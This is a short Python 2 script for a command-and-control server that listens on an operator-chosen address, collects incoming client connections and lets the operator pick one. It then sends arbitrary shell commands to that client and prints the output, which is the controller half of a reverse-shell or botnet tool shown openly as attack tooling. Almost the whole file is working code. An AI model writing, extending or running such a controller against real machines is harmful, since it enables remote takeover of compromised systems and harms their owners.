#!/usr/bin/python

import socket
import threading
import sys
import os
import time

time.sleep(0.5)

print """
  Select from the menu:

1. Accept
2. list
3. Interact <id>
4. Quit (close all connections)
5. Close (Close current session)
6. Exit	
"""	
ip_addr = raw_input("cnc > set lhost: ")
port = int(raw_input("\ncnc > set lport: "))

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.settimeout(5)
server.bind((ip_addr, port))
server.listen(10)

allConnections = []
allAddress = []

def getconnections():

	for item in allConnections:
		item.close()

	del allConnections[:]
	del allAddress[:]

	while 1:

		try:
			
			client,addr =  server.accept()
			client.setblocking(1)
			allConnections.append(client)
			allAddress.append(addr)
		except:

			break

def close_connection():

	allConnections[choseone].send("close")
	allConnections[choseone].close()

	
while 1:
 
	input = raw_input("\ncnc > ")

	if (input == "Accept" or input == "accept"):
 	
		getconnections()

	elif (input == "list" or input == "List"):
		print "------------------\nClients:\n------------------"
		for item in allAddress:
			print "%d - %s:%s" % (allAddress.index(item) + 1, str(item[0]), str(item[1]))
		print "\n"

	elif (input == "quit" or input == "QUIT"):
		
		for item in allConnections:
			item.send("quit")
			item.close()
		#os._exit(1)

	elif (input == "exit" or input == "EXIT"):
		
			os._exit(1)

	elif ("interact" in input):

		choseone = int(input.replace("interact ", "")) -1
		if  ((choseone < len(allAddress)) and (choseone >= 0)):


			while True:
		
				try:
					command = raw_input("\nconnected~cnc > ")
					#command = sys.stdin.readline()
					if command == "exit":
						print "[!] Exiting..!"
						allConnections[choseone].send(command)
						allConnections[choseone].close()
						os._exit(1)
					
					elif command == "close":
							
						close_connection()
						break;

					elif ("cd " in command):
						
						allConnections[choseone].send(command)
						msg=allConnections[choseone].recv(4096)
						path = msg + ">"
						print "Changed dir to %s" % path
					
					elif command == "back":
						
						break;

					else:	
						
						allConnections[choseone].send(command)
						# if recvd == # break loop and ask next command
						try :
							recvd = allConnections[choseone].recv(4096)
							while "#" not in recvd:
								recvd = recvd.rstrip('\n')
								print recvd
								recvd = allConnections[choseone].recv(4096)
						except KeyboardInterrupt:
							pass	
					
				except Exception, e:
					pass